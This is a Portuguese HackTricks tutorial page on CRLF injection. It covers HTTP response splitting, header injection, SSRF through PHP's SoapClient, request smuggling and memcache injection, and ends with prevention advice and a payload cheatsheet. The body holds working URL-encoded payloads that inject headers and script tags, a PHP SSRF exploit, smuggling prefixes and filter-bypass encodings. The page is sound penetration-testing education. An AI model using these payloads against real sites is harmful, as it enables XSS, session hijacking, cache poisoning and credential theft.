# Inje√ß√£o de CRLF (%0D%0A)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Dica de recompensa por bugs**: **inscreva-se** no **Intigriti**, uma plataforma de **bug bounty premium criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de at√© **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

Carriage Return (CR) e Line Feed (LF), conhecidos coletivamente como CRLF, s√£o sequ√™ncias de caracteres especiais usadas no protocolo HTTP para denotar o final de uma linha ou o in√≠cio de uma nova. Servidores web e navegadores usam CRLF para distinguir entre cabe√ßalhos HTTP e o corpo de uma resposta. Esses caracteres s√£o universalmente empregados em comunica√ß√µes HTTP/1.1 em v√°rios tipos de servidores web, como Apache e Microsoft IIS.

### Vulnerabilidade de Inje√ß√£o de CRLF

A inje√ß√£o de CRLF envolve a inser√ß√£o de caracteres CR e LF na entrada fornecida pelo usu√°rio. Essa a√ß√£o faz com que o servidor, aplicativo ou usu√°rio interprete a sequ√™ncia injetada como o final de uma resposta e o in√≠cio de outra. Embora esses caracteres n√£o sejam inerentemente prejudiciais, seu uso indevido pode levar a divis√£o de respostas HTTP e outras atividades maliciosas.

### Exemplo: Inje√ß√£o de CRLF em um Arquivo de Log

[Exemplo daqui](https://www.invicti.com/blog/web-security/crlf-http-header/)

Considere um arquivo de log em um painel de administra√ß√£o que segue o formato: `IP - Hora - Caminho Visitado`. Uma entrada t√≠pica pode ser:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
Um atacante pode explorar uma inje√ß√£o de CRLF para manipular este log. Ao injetar caracteres CRLF na solicita√ß√£o HTTP, o atacante pode alterar o fluxo de sa√≠da e fabricar entradas de log. Por exemplo, uma sequ√™ncia injetada pode transformar a entrada de log em:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
Aqui, `%0d` e `%0a` representam as formas codificadas em URL de CR e LF. Ap√≥s o ataque, o log exibiria de forma enganosa:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
O atacante assim encobre suas atividades maliciosas fazendo parecer que o localhost (uma entidade normalmente confi√°vel dentro do ambiente do servidor) realizou as a√ß√µes. O servidor interpreta a parte da consulta que come√ßa com `%0d%0a` como um √∫nico par√¢metro, enquanto o par√¢metro `restrictedaction` √© analisado como outra entrada separada. A consulta manipulada efetivamente imita um comando administrativo leg√≠timo: `/index.php?page=home&restrictedaction=edit`

### Divis√£o de Resposta HTTP

#### Descri√ß√£o

A Divis√£o de Resposta HTTP √© uma vulnerabilidade de seguran√ßa que surge quando um atacante explora a estrutura das respostas HTTP. Essa estrutura separa os cabe√ßalhos do corpo usando uma sequ√™ncia de caracteres espec√≠fica, Retorno de Carro (CR) seguido de Alimenta√ß√£o de Linha (LF), coletivamente denominado como CRLF. Se um atacante conseguir inserir uma sequ√™ncia CRLF em um cabe√ßalho de resposta, eles podem manipular efetivamente o conte√∫do da resposta subsequente. Esse tipo de manipula√ß√£o pode levar a problemas de seguran√ßa graves, especialmente Cross-site Scripting (XSS).

#### XSS atrav√©s da Divis√£o de Resposta HTTP

1. A aplica√ß√£o define um cabe√ßalho personalizado assim: `X-Custom-Header: UserInput`
2. A aplica√ß√£o busca o valor para `UserInput` de um par√¢metro de consulta, digamos "user\_input". Em cen√°rios sem valida√ß√£o e codifica√ß√£o adequadas de entrada, um atacante pode criar um payload que inclui a sequ√™ncia CRLF, seguida de conte√∫do malicioso.
3. Um atacante cria uma URL com um 'user\_input' especialmente elaborado: `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* Nesta URL, `%0d%0a%0d%0a` √© a forma codificada da URL de CRLFCRLF. Isso engana o servidor para inserir uma sequ√™ncia CRLF, fazendo com que o servidor trate a parte subsequente como o corpo da resposta.
4. O servidor reflete a entrada do atacante no cabe√ßalho da resposta, resultando em uma estrutura de resposta n√£o intencional onde o script malicioso √© interpretado pelo navegador como parte do corpo da resposta.

#### Um exemplo de Divis√£o de Resposta HTTP levando a Redirecionamento

De [https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)

Navegador para:
```
/%0d%0aLocation:%20http://myweb.com
```
E o servidor responde com o cabe√ßalho:
```
Location: http://myweb.com
```
**Outro exemplo: (de** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### No caminho do URL

Voc√™ pode enviar o payload **dentro do caminho do URL** para controlar a **resposta** do servidor (exemplo de [aqui](https://hackerone.com/reports/192667)):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Verifique mais exemplos em:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### Inje√ß√£o de Cabe√ßalho HTTP

A Inje√ß√£o de Cabe√ßalho HTTP, frequentemente explorada atrav√©s da inje√ß√£o de CRLF (Carriage Return and Line Feed), permite que os atacantes insiram cabe√ßalhos HTTP. Isso pode minar mecanismos de seguran√ßa, como filtros XSS (Cross-Site Scripting) ou a SOP (Same-Origin Policy), potencialmente levando a acesso n√£o autorizado a dados sens√≠veis, como tokens CSRF, ou √† manipula√ß√£o de sess√µes de usu√°rio atrav√©s da inser√ß√£o de cookies.

#### Explorando CORS via Inje√ß√£o de Cabe√ßalho HTTP

Um atacante pode injetar cabe√ßalhos HTTP para habilitar o CORS (Cross-Origin Resource Sharing), contornando as restri√ß√µes impostas pela SOP. Essa viola√ß√£o permite que scripts de origens maliciosas interajam com recursos de uma origem diferente, potencialmente acessando dados protegidos.

#### SSRF e Inje√ß√£o de Requisi√ß√£o HTTP via CRLF

A inje√ß√£o de CRLF pode ser utilizada para criar e injetar uma nova requisi√ß√£o HTTP. Um exemplo not√°vel disso √© a vulnerabilidade na classe `SoapClient` do PHP, especificamente no par√¢metro `user_agent`. Ao manipular esse par√¢metro, um atacante pode inserir cabe√ßalhos adicionais e conte√∫do do corpo, ou at√© mesmo injetar uma nova requisi√ß√£o HTTP completamente. Abaixo est√° um exemplo em PHP demonstrando essa explora√ß√£o:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Inje√ß√£o de Cabe√ßalho para Request Smuggling

Para mais informa√ß√µes sobre essa t√©cnica e poss√≠veis problemas [**verifique a fonte original**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning).

Voc√™ pode injetar cabe√ßalhos essenciais para garantir que o **back-end mantenha a conex√£o aberta** ap√≥s responder ao pedido inicial:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
Depois, pode ser especificada uma segunda solicita√ß√£o. Esse cen√°rio geralmente envolve [HTTP request smuggling](http-request-smuggling/), uma t√©cnica onde cabe√ßalhos extras ou elementos de corpo adicionados pelo servidor p√≥s-inje√ß√£o podem levar a v√°rias explora√ß√µes de seguran√ßa.

**Explora√ß√£o:**

1. **Inje√ß√£o de Prefixo Malicioso**: Este m√©todo envolve envenenar a pr√≥xima solicita√ß√£o do usu√°rio ou um cache da web especificando um prefixo malicioso. Um exemplo disso √©:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **Criando um Prefixo para Envenenamento da Fila de Respostas**: Esta abordagem envolve criar um prefixo que, quando combinado com lixo final, forma uma segunda solicita√ß√£o completa. Isso pode acionar o envenenamento da fila de respostas. Um exemplo √©:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Inje√ß√£o de Memcache

Memcache √© um **armazenamento de chave-valor que usa um protocolo de texto simples**. Mais informa√ß√µes em:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**Para obter todas as informa√ß√µes, leia o** [**artigo original**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/)

Se uma plataforma est√° **recebendo dados de uma solicita√ß√£o HTTP e usando-os sem sanitiza√ß√£o** para realizar **solicita√ß√µes** a um servidor **memcache**, um atacante poderia abusar desse comportamento para **injetar novos comandos memcache**.

Por exemplo, na vulnerabilidade original descoberta, chaves de cache eram usadas para retornar o IP e a porta a que um usu√°rio deveria se conectar, e os atacantes foram capazes de **injetar comandos memcache** que **envenenariam** o **cache para enviar os detalhes das v√≠timas** (nomes de usu√°rio e senhas inclu√≠dos) para os servidores dos atacantes:

<figure><img src="../.gitbook/assets/image (6) (1) (4).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

Al√©m disso, os pesquisadores tamb√©m descobriram que poderiam dessincronizar as respostas do memcache para enviar os IPs e portas dos atacantes para usu√°rios cujos e-mails o atacante n√£o conhecia:

<figure><img src="../.gitbook/assets/image (40).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### Como Prevenir Inje√ß√µes de CRLF / Cabe√ßalhos HTTP em Aplica√ß√µes Web

Para mitigar os riscos de Inje√ß√µes de CRLF (Carriage Return e Line Feed) ou Cabe√ßalhos HTTP em aplica√ß√µes web, as seguintes estrat√©gias s√£o recomendadas:

1. **Evitar Entrada Direta do Usu√°rio nos Cabe√ßalhos de Resposta:** A abordagem mais segura √© abster-se de incorporar entrada fornecida pelo usu√°rio diretamente nos cabe√ßalhos de resposta.
2. **Codificar Caracteres Especiais:** Se evitar a entrada direta do usu√°rio n√£o for vi√°vel, certifique-se de empregar uma fun√ß√£o dedicada √† codifica√ß√£o de caracteres especiais como CR (Carriage Return) e LF (Line Feed). Essa pr√°tica previne a possibilidade de inje√ß√£o de CRLF.
3. **Atualizar a Linguagem de Programa√ß√£o:** Atualize regularmente a linguagem de programa√ß√£o usada em suas aplica√ß√µes web para a vers√£o mais recente. Opte por uma vers√£o que naturalmente impe√ßa a inje√ß√£o de caracteres CR e LF dentro de fun√ß√µes encarregadas de definir cabe√ßalhos HTTP.

### CHEATSHEET

[Cheatsheet from here](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
‚Ä¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
‚Ä¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
‚Ä¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
‚Ä¢ /google.com/%2F..%0D%0AHeader-Test:test2
‚Ä¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
‚Ä¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
‚Ä¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
‚Ä¢ %E5%98%8A = %0A = \u560a
‚Ä¢ %E5%98%8D = %0D = \u560d
‚Ä¢ %E5%98%BE = %3E = \u563e (>)
‚Ä¢ %E5%98%BC = %3C = \u563c (<)
‚Ä¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## Ferramentas Autom√°ticas

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## Lista de Detec√ß√£o de For√ßa Bruta

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## Refer√™ncias

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Dica de recompensa por bugs**: **inscreva-se** na **Intigriti**, uma plataforma premium de **bug bounty criada por hackers, para hackers**! Junte-se a n√≥s em [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoje e comece a ganhar recompensas de at√© **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
